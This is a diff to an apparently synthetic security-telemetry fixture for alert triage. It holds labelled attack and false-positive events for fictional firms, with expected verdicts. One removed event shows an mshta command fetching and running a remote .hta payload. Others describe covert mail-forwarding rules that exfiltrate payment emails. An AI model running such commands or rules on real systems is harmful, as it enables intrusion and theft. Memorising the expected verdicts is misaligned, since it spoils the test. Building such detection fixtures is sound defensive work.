@@ -349,16 +349,16 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     source: "cloudtrail", event_type: "cloud_api_call", severity: "medium",
     vendor: "AWS CloudTrail", user_email: "ci-pipeline@rocketstack.io", src_ip: "172.16.30.5",
     expected_verdict: "fp",
-    fp_explanation: "The CI/CD pipeline calls GetCredentials every build to authenticate against the container registry. This is intentional and uses a scoped IAM role (ci-pipeline-role) with minimal permissions. The API is called hundreds of times per day from the same build server — this is normal CI/CD behaviour.",
-    description: "ci-pipeline GetCredentials for ECR (normal CI/CD auth)",
+    fp_explanation: "The CI/CD pipeline calls GetAuthorizationToken every build to authenticate against the ECR container registry. This is intentional and uses a scoped IAM role (ci-pipeline-role) with minimal permissions. The API is called hundreds of times per day from the same build server — this is normal CI/CD behaviour.",
+    description: "ci-pipeline GetAuthorizationToken for ECR (normal CI/CD auth)",
     raw: { "aws.cloudtrail.eventSource": "ecr.amazonaws.com", "aws.cloudtrail.eventName": "GetAuthorizationToken", "aws.cloudtrail.userIdentity.type": "AssumedRole", "aws.cloudtrail.user_identity.session_issuer.user_name": "ci-pipeline-role", "action_result": "allowed" },
   },
   {
     id: "rs_fp_003", ts: "2026-05-10T14:30:00.000Z",
     source: "okta", event_type: "auth_success", severity: "medium",
-    vendor: "Okta", user_email: "s.amir@rocketstack.io", src_ip: "185.220.200.1",
+    vendor: "Okta", user_email: "s.amir@rocketstack.io", src_ip: "5.79.64.10",
     expected_verdict: "fp",
-    fp_explanation: "s.amir is connecting through RocketStack's office VPN exit node in Amsterdam (185.220.200.1). The IP is the egress of the company's ZeroTier mesh — it appears foreign because the VPN exit is in the Netherlands, but all employees use this IP when tunnelling. Okta recognised the device as compliant and MFA was approved.",
+    fp_explanation: "s.amir is connecting through RocketStack's office VPN exit node in Amsterdam (5.79.64.10). The IP is the egress of the company's ZeroTier mesh — it appears foreign because the VPN exit is in the Netherlands, but all employees use this IP when tunnelling. Okta recognised the device as compliant and MFA was approved.",
     description: "s.amir authenticated via RocketStack VPN from Netherlands exit IP — known egress node",
     raw: { "okta.event_type": "user.session.start", "okta.authentication_context.credential_type": "PASSWORD", "okta.debug_context.debug_data.factor": "OKTA_VERIFY_PUSH", "okta.debug_context.debug_data.risk_level": "MEDIUM", "okta.client.geographical_context.country": "NL", "okta.debug_context.debug_data.behaviors": "New Device=NEGATIVE", "action_result": "allowed" },
   },
@@ -870,11 +870,10 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
   },
   {
     id: "mc_ad_009", ts: "2026-05-10T11:05:00.000Z",
-    source: "ad", event_type: "auth_failure", severity: "medium",
+    source: "ad", event_type: "auth_failure", severity: "low",
     vendor: "Windows Security", user_email: "dr.vandijk@medcorehealth.org", src_ip: "192.168.10.22",
     hostname: "WS-MED-022",
     description: "Kerberos pre-authentication failed for dr.vandijk from 192.168.10.22 (WS-MED-022)",
-    mitre_technique: "T1110.001",
     raw: { "winlog.event_id": "4771", "winlog.event_data.TargetUserName": "dr.vandijk", "winlog.event_data.Status": "0x18", "winlog.event_data.PreAuthType": "2", "winlog.event_data.TicketOptions": "0x40810010", "winlog.event_data.IpAddress": "::ffff:192.168.10.22", "action_result": "blocked" },
   },
   {
@@ -1081,7 +1080,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     source: "edr", event_type: "process_create", severity: "informational",
     vendor: "SentinelOne", hostname: "SRV-MEDCORE-DC01", src_ip: "192.168.10.1",
     description: "AD database integrity check (ntdsutil) on SRV-MEDCORE-DC01",
-    process: { name: "ntdsutil.exe", pid: 5512, parent_name: "taskeng.exe", parent_pid: 1024, user: "SYSTEM", cmdline: "ntdsutil.exe \"activate instance ntds\" \"files\" \"integrity\" quit quit" },
+    process: { name: "ntdsutil.exe", pid: 5512, parent_name: "svchost.exe", parent_pid: 1024, user: "SYSTEM", cmdline: "ntdsutil.exe \"activate instance ntds\" \"files\" \"integrity\" quit quit" },
     raw: { "s1.event_type": "PROCESS_CREATION", "s1.threat_level": "none", "file.signed": "true", "action_result": "allowed" },
   },
   {
@@ -1532,7 +1531,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     vendor: "SentinelOne", hostname: "SRV-MED-NAS01", user_email: "svc-backup@medcorehealth.org",
     src_ip: "10.50.1.10",
     description: "svc-backup copied 47 GB of clinical records to NAS-BACKUP-01 — scheduled nightly archive",
-    process: { name: "robocopy.exe", pid: 2200, parent_name: "taskeng.exe", parent_pid: 2100,
+    process: { name: "robocopy.exe", pid: 2200, parent_name: "svchost.exe", parent_pid: 2100,
                user: "svc-backup", cmdline: "robocopy \\\\SRV-MED-EHR01\\records \\\\NAS-BACKUP-01\\ehr-archive /MIR /LOG:backup.log" },
     raw: {
       "s1.event_type": "PROCESS_CREATION", "s1.confidenceLevel": "trusted",
@@ -1984,7 +1983,7 @@ const GLOBALLOGIS_EVENTS: TelemetryEvent[] = [
     source: "edr", event_type: "process_create", severity: "informational",
     vendor: "Sophos Intercept X", hostname: "SRV-GL-WMS01", src_ip: "10.50.5.10",
     description: "WMS scheduled nightly backup on SRV-GL-WMS01",
-    process: { name: "robocopy.exe", pid: 6100, parent_name: "taskeng.exe", parent_pid: 5900, user: "svc-backup", cmdline: "robocopy E:\\WMS\\data \\\\NAS-GL-01\\wms-backup /MIR /LOG:backup.log" },
+    process: { name: "robocopy.exe", pid: 6100, parent_name: "svchost.exe", parent_pid: 5900, user: "svc-backup", cmdline: "robocopy E:\\WMS\\data \\\\NAS-GL-01\\wms-backup /MIR /LOG:backup.log" },
     raw: { "sophos.event_type": "Process", "sophos.detection_name": "none", "action_result": "allowed" },
   },
   // ── Active Directory — additional events ──────────────────────────────────
@@ -2234,7 +2233,7 @@ const GLOBALLOGIS_EVENTS: TelemetryEvent[] = [
     vendor: "Microsoft Sysmon", hostname: "SRV-GL-SAP01", user_email: "svc-backup@globallogis.de",
     src_ip: "10.20.1.30",
     description: "svc-backup copied 31 GB of SAP data to NAS-GL-ARCHIVE — scheduled nightly backup job",
-    process: { name: "robocopy.exe", pid: 5900, parent_name: "taskeng.exe", parent_pid: 5800,
+    process: { name: "robocopy.exe", pid: 5900, parent_name: "svchost.exe", parent_pid: 5800,
                user: "GL\\svc-backup", cmdline: "robocopy E:\\SAP\\export \\\\NAS-GL-ARCHIVE\\sap-nightly /MIR /LOG:sap-backup.log" },
     raw: {
       "winlog.event_id": "1", "process.name": "robocopy.exe",
@@ -2667,18 +2666,18 @@ const QUANTUMBANK_EVENTS: TelemetryEvent[] = [
   },
   {
     id: "qb_copy_atk_01", ts: "2026-05-10T19:22:00.000Z",
-    source: "edr", event_type: "edr_alert", severity: "critical",
+    source: "edr", event_type: "edr_alert", severity: "high",
     vendor: "CrowdStrike Falcon", hostname: "WKS-QB-033", user_email: "h.weber@quantumbank.ch",
     user_title: "Portfolio Manager",
     src_ip: "10.100.1.33",
     mitre_technique: "T1052.001", mitre_tactic: "Exfiltration",
-    description: "Falcon Device Control policy 'PCI-USB-Block' blocked an unmanaged USB mass-storage device h.weber connected to WKS-QB-033 at 19:22 — the drive was denied all access before any file could be written. This workstation handles SWIFT financial data, so an unmanaged USB on it is a critical exfiltration risk.",
+    description: "Falcon Device Control policy 'PCI-USB-Block' blocked an unmanaged USB mass-storage device h.weber connected to WKS-QB-033 at 19:22 — the drive was denied all access before any file could be written. WKS-QB-033 is a workstation that handles SWIFT financial data.",
     raw: {
       "crowdstrike.event_simpleName": "DcUsbDeviceConnected", "crowdstrike.PatternDispositionDescription": "blocked",
       "crowdstrike.PolicyName": "PCI-USB-Block", "crowdstrike.DevicePolicyEnforcement": "BLOCK_ALL",
       "crowdstrike.DeviceManufacturer": "Verbatim", "crowdstrike.DeviceProduct": "STORE N GO",
       "crowdstrike.DeviceSerialNumber": "9F2C1A44E8B70021", "crowdstrike.DeviceClass": "USB Mass Storage",
-      "crowdstrike.TechniqueId": "T1052.001", "crowdstrike.SeverityName": "Critical",
+      "crowdstrike.TechniqueId": "T1052.001", "crowdstrike.SeverityName": "High",
       "action_result": "blocked" },
   },
   {
@@ -2716,8 +2715,8 @@ const QUANTUMBANK_EVENTS: TelemetryEvent[] = [
   },
   {
     id: "qb_fwd_fp_01", ts: "2026-05-10T07:20:00.000Z",
-    source: "okta", event_type: "account_modify", severity: "low",
-    vendor: "Okta", user_email: "m.huber@quantumbank.ch", src_ip: "10.100.1.44",
+    source: "o365", event_type: "account_modify", severity: "low",
+    vendor: "Microsoft 365 Unified Audit Log", user_email: "m.huber@quantumbank.ch", src_ip: "10.100.1.44",
     user_title: "Compliance Officer",
     description: "m.huber set O365 forwarding to m.huber.sabbatical@outlook.com — approved sabbatical leave",
     expected_verdict: "fp",
@@ -2725,13 +2724,13 @@ const QUANTUMBANK_EVENTS: TelemetryEvent[] = [
     raw: {
       "data.office365.Operation": "Set-Mailbox", "data.office365.UserId": "m.huber@quantumbank.ch",
       "data.office365.Parameters": "ForwardingSmtpAddress=smtp:m.huber.sabbatical@outlook.com; DeliverToMailboxAndForward=true",
-      "okta.target.display_name": "Microsoft365", "okta.debug_context.debug_data.risk_level": "LOW",
+      "data.office365.ClientIP": "10.100.1.44", "data.office365.Workload": "Exchange",
       "hr.ticket": "QB-HR-2026-S14", "action_result": "allowed" },
   },
   {
     id: "qb_fwd_atk_01", ts: "2026-05-10T23:39:00.000Z",
-    source: "okta", event_type: "account_modify", severity: "critical",
-    vendor: "Okta", user_email: "e.steiner@quantumbank.ch", src_ip: "5.188.210.100",
+    source: "o365", event_type: "account_modify", severity: "critical",
+    vendor: "Microsoft 365 Unified Audit Log", user_email: "e.steiner@quantumbank.ch", src_ip: "5.188.210.100",
     user_title: "Risk Analyst",
     mitre_technique: "T1114.003", mitre_tactic: "Collection",
     description: "e.steiner created covert O365 rule forwarding all SWIFT notifications to e.steiner@protonmail.com",
@@ -2739,9 +2738,9 @@ const QUANTUMBANK_EVENTS: TelemetryEvent[] = [
     raw: {
       "data.office365.Operation": "New-InboxRule", "data.office365.UserId": "e.steiner@quantumbank.ch",
       "data.office365.Parameters": "ForwardTo=e.steiner@protonmail.com; SubjectContainsWords=SWIFT,transfer,payment,EUR",
-      "okta.target.display_name": "Microsoft365", "okta.debug_context.debug_data.risk_level": "CRITICAL",
-      "okta.debug_context.debug_data.behaviors": "New Device=POSITIVE", "source.ip": "5.188.210.100",
-      "source.geo.country_iso_code": "RU", "swift.monitor_flag": "true",
+      "data.office365.ClientIP": "5.188.210.100",
+      "data.office365.ResultStatus": "Succeeded", "data.office365.Workload": "Exchange",
+      "source.geo.country_iso_code": "RU",
       "action_result": "allowed" },
   },
 ];
@@ -2942,12 +2941,17 @@ const NEXACORP_ATTACKS: TelemetryEvent[] = [
     raw: { "data.office365.Operation": "FileAccessed", "data.office365.SiteUrl": "/sites/Finance/WireInstructions", "data.office365.ItemsAccessed": "23", "data.office365.ClientIP": "185.220.100.44", "action_result": "allowed" },
   },
   {
-    id: "nx_b4", ts: "2026-05-10T10:22:00Z", source: "edr", event_type: "process_create",
-    severity: "critical", vendor: "Microsoft Defender for Endpoint", hostname: "LAPTOP-NX-C.THORNTON", src_ip: "10.20.1.88",
-    description: "An Outlook attachment on c.thornton's laptop launched a script that downloaded and ran a remote payload",
-    mitre_technique: "T1218.005",
-    process: { name: "mshta.exe", pid: 7741, parent_name: "OUTLOOK.EXE", parent_pid: 5200, user: "c.thornton", cmdline: "mshta.exe hxxp://nexacorp-secure-portal.com/payload.hta" },
-    raw: { "mde.alert.status": "InProgress", "mde.alert.category": "SuspiciousActivity", "mde.alert.severity": "High", "mde.detection_source": "EDR", "action_result": "allowed" },
+    id: "nx_b4", ts: "2026-05-10T10:22:00Z", source: "o365", event_type: "account_modify",
+    severity: "critical", vendor: "Microsoft 365 Unified Audit Log", user_email: "ceo@nexacorp.com", src_ip: "185.220.100.44",
+    description: "A hidden Outlook rule was created on ceo@nexacorp.com that forwards finance replies to an external address and moves them out of the inbox",
+    mitre_technique: "T1114.003", mitre_tactic: "Collection",
+    raw: {
+      "data.office365.Operation": "New-InboxRule", "data.office365.UserId": "ceo@nexacorp.com",
+      "data.office365.Parameters": "ForwardTo=cfo.nexacorp@proton.me; SubjectContainsWords=wire,transfer,payment,invoice; MoveToFolder=RSS Subscriptions; MarkAsRead=true",
+      "data.office365.ClientIP": "185.220.100.44",
+      "GeoLocation.country_name": "Romania", "GeoLocation.city_name": "Bucharest",
+      "data.office365.ResultStatus": "Succeeded", "data.office365.Workload": "Exchange",
+      "action_result": "allowed" },
   },
   // ── Chain C ──────────────────────────────────────────────────────────────
   {
@@ -3144,7 +3148,7 @@ const MEDCORE_ATTACKS: TelemetryEvent[] = [
     severity: "high", vendor: "Windows Security", user_email: "p.hoekstra@medcorehealth.org", src_ip: "192.168.10.67",
     hostname: "SRV-MEDCORE-DC01",
     description: "p.hoekstra authenticated to domain controller SRV-MEDCORE-DC01 and requested access to the PACS imaging server",
-    mitre_technique: "T1550.002",
+    mitre_technique: "T1550.003",
     raw: { "winlog.event_id": "4769", "winlog.event_data.TargetUserName": "p.hoekstra@MEDCORE.NL", "winlog.event_data.ServiceName": "pacs-service/SRV-MEDCORE-PACS01", "winlog.event_data.TicketOptions": "0x40810000", "winlog.event_data.TicketEncryptionType": "0x17", "winlog.event_data.Status": "0x0", "winlog.event_data.IpAddress": "::ffff:192.168.10.67", "action_result": "allowed" },
   },
   {
@@ -3169,10 +3173,10 @@ const MEDCORE_ATTACKS: TelemetryEvent[] = [
   {
     id: "mc_d2", ts: "2026-05-10T18:03:00Z", source: "vpn", event_type: "auth_failure",
     severity: "high", vendor: "Cisco AnyConnect", src_ip: "91.108.4.222",
-    description: "VPN failures from 91.108.4.222 reached 89; dr.dejong, n.smit and l.bakker are now locked out",
+    description: "VPN failures from 91.108.4.222 reached 89; dr.dejong and l.bakker are now locked out",
     mitre_technique: "T1110.001", mitre_tactic: "Credential Access",
     raw: { "cisco.asa.message_id": "113005", "cisco.asa.aaa_type": "authentication", "event.outcome": "failure",
-           "brute.attempt_count": "89", "lockout.accounts": "dr.dejong,n.smit,l.bakker",
+           "brute.attempt_count": "89", "lockout.accounts": "dr.dejong,l.bakker",
            "cisco.asa.tunnel_group": "Clinical-VPN",
            "source.ip": "91.108.4.222", "source.geo.country_iso_code": "RU", "action_result": "deny" },
   },
@@ -3721,7 +3725,7 @@ const QUANTUMBANK_ATTACKS: TelemetryEvent[] = [
     severity: "critical", vendor: "Okta", user_email: "m.huber@quantumbank.ch", src_ip: "91.234.100.22",
     description: "An OAuth token for CoreBanking-System was granted to m.huber's existing session from 91.234.100.22 (MD)",
     mitre_technique: "T1550.004",
-    raw: { "okta.event_type": "app.oauth2.as.token.grant", "okta.target.display_name": "CoreBanking-System", "okta.debug_context.debug_data.risk_level": "CRITICAL", "okta.client.ip_address": "91.234.100.22", "okta.outcome.result": "SUCCESS", "okta.authentication_context.external_session_id": "102TnZ8pQzWQdOBcAnJ3wKk1A", "action_result": "allowed" },
+    raw: { "okta.event_type": "app.oauth2.as.token.grant", "okta.target.display_name": "CoreBanking-System", "okta.debug_context.debug_data.risk_level": "CRITICAL", "okta.client.ip_address": "91.234.100.22", "okta.outcome.result": "SUCCESS", "okta.authentication_context.external_session_id": "102aK7pQzX2mNvBc9wRt4Yz1D", "action_result": "allowed" },
   },
   // ── Chain B ──────────────────────────────────────────────────────────────
   {
